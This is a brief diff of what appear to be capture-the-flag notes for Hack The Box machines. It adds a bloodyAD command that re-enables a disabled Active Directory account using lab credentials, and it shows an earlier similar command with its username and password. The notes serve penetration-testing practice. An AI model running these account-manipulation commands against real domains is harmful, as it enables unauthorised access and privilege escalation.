@@ -2,6 +2,8 @@ enable user:
 ```bash
 bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
 
+
+bloodyAD -u john -p face -d tombwatcher.htb --dc-ip 10.10.11.72 remove uac testuser -f ACCOUNTDISABLE
 ```
 ant.edwards, Antman2025! -> valid user
 adam.silver -> account to be enabled
